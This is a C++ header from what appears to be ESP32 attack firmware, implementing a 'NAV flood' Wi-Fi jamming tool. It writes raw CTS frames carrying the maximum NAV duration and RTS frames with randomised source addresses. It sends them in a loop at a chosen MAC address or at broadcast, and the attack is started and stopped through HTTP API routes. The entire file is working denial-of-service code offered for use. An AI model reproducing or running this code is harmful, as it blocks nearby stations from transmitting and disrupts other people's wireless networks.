#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// NAV flood: CTS/RTS frames with large NAV duration
// Blocks virtual carrier-sense for nearby stations
// mode: cts (CTS with max NAV=32767), rts (RTS flood), both
static bool nf_running = false;
static uint8_t nf_target[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
static volatile uint32_t nf_sent = 0;
static uint8_t nf_mode = 0;  // 0=cts, 1=rts, 2=both
static TaskHandle_t nf_task = nullptr;

static void nf_run(void *) {
  uint8_t f[32];
  nf_sent = 0;
  while (nf_running) {
    if (!safety_rate_ok(1)) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }
    size_t n;
    uint8_t ta[6];
    for (int k = 0; k < 6; k++)
      ta[k] = esp_random() & 0xFF;
    ta[0] = (ta[0] & 0xFC) | 0x02;
    switch (nf_mode) {
      case 0:  // CTS with max NAV (32767 μs ≈ 32ms)
        f[0] = 0xC4;
        f[1] = 0x00;
        f[2] = 0xFF;
        f[3] = 0x7F;
        memcpy(f + 4, nf_target, 6);
        n = 10;
        break;
      case 1:
        n = f_rts(f, nf_target, ta);
        break;
      case 2:
        if (nf_sent & 1) {
          f[0] = 0xC4;
          f[1] = 0x00;
          f[2] = 0xFF;
          f[3] = 0x7F;
          memcpy(f + 4, nf_target, 6);
          n = 10;
        } else {
          n = f_rts(f, nf_target, ta);
        }
        break;
      default:
        vTaskDelay(pdMS_TO_TICKS(100));
        continue;
    }
    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    nf_sent++;
    vTaskDelay(pdMS_TO_TICKS(1));
  }
  nf_task = nullptr;
  vTaskDelete(nullptr);
}

static bool nf_start(const String &q) {
  int i;
  String tgt, mo, ch;
  if ((i = q.indexOf("target=")) >= 0) {
    int e = q.indexOf('&', i);
    tgt = q.substring(i + 7, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("mode=")) >= 0) {
    int e = q.indexOf('&', i);
    mo = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if (tgt.length() == 17)
    sscanf(tgt.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&nf_target[0], (unsigned *)&nf_target[1],
           (unsigned *)&nf_target[2], (unsigned *)&nf_target[3], (unsigned *)&nf_target[4],
           (unsigned *)&nf_target[5]);
  else
    memset(nf_target, 0xff, 6);
  nf_mode = (mo == "rts") ? 1 : (mo == "both") ? 2 : 0;
  uint8_t c = ch.toInt();
  if (c)
    esp_wifi_set_channel(c, WIFI_SECOND_CHAN_NONE);
  nf_running = true;
  nf_sent = 0;
  xTaskCreate(nf_run, "nf_run", 3072, nullptr, 5, &nf_task);
  return true;
}
static void nf_stop() {
  nf_running = false;
}
static void nf_routes() {
  extern WebServer server;
  server.on("/api/navflood/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("navflood", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/navflood/stop", HTTP_POST, []() {
    tool_stop("navflood");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/navflood/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(nf_running ? 1 : 0) + ",\"sent\":" + String(nf_sent) +
                    ",\"msg\":\"sent " + String(nf_sent) + "\"}");
  });
}
